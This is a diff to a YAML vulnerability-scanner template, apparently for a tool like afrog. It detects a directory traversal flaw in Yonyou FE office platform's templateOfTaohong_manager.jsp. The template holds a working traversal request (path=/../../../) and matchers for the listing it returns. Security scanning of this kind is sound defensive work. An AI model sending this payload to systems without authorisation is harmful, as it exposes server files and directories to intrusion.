@@ -1,21 +1,19 @@
-expression: r0()
 id: yongyou-fe-templateoftaohong-manager-path-traversal
+
 info:
+  name: 用友 FE协作办公平台 templateOfTaohong_manager.jsp 目录遍历漏洞
   author: zan8in
-  description: "\u7528\u53CB FE\u534F\u4F5C\u529E\u516C\u5E73\u53F0 templateOfTaohong_manager.jsp\u6587\
-    \u4EF6\u5B58\u5728\u76EE\u5F55\u904D\u5386\u6F0F\u6D1E\uFF0C\u901A\u8FC7\u6F0F\
-    \u6D1E\u653B\u51FB\u8005\u53EF\u4EE5\u83B7\u53D6\u76EE\u5F55\u6587\u4EF6\u7B49\
-    \u4FE1\u606F\uFF0C\u5BFC\u81F4\u8FDB\u4E00\u6B65\u653B\u51FB\n\"FE\u534F\u4F5C\
-    \"\n"
-  name: "\u7528\u53CB FE\u534F\u4F5C\u529E\u516C\u5E73\u53F0 templateOfTaohong_manager.jsp\
-    \ \u76EE\u5F55\u904D\u5386\u6F0F\u6D1E"
-  reference:
-  - http://wiki.peiqi.tech/wiki/oa/%E7%94%A8%E5%8F%8BOA/%E7%94%A8%E5%8F%8B%20FE%E5%8D%8F%E4%BD%9C%E5%8A%9E%E5%85%AC%E5%B9%B3%E5%8F%B0%20templateOfTaohong_manager.jsp%20%E7%9B%AE%E5%BD%95%E9%81%8D%E5%8E%86%E6%BC%8F%E6%B4%9E.html
   severity: medium
+  description: |
+    用友 FE协作办公平台 templateOfTaohong_manager.jsp文件存在目录遍历漏洞，通过漏洞攻击者可以获取目录文件等信息，导致进一步攻击
+    "FE协作"
+  reference:
+    - http://wiki.peiqi.tech/wiki/oa/%E7%94%A8%E5%8F%8BOA/%E7%94%A8%E5%8F%8B%20FE%E5%8D%8F%E4%BD%9C%E5%8A%9E%E5%85%AC%E5%B9%B3%E5%8F%B0%20templateOfTaohong_manager.jsp%20%E7%9B%AE%E5%BD%95%E9%81%8D%E5%8E%86%E6%BC%8F%E6%B4%9E.html
+
 rules:
   r0:
-    expression: response.status == 200 && response.body.bcontains(b'boot.ini')&& response.body.bcontains(b'[FE_MESSAGE_PUSH]')&&
-      response.body.bcontains(b'[OA]')
     request:
       method: GET
       path: /system/mediafile/templateOfTaohong_manager.jsp?path=/../../../
+    expression: response.status == 200 && response.body.bcontains(b'boot.ini')&& response.body.bcontains(b'[FE_MESSAGE_PUSH]')&& response.body.bcontains(b'[OA]')
+expression: r0()
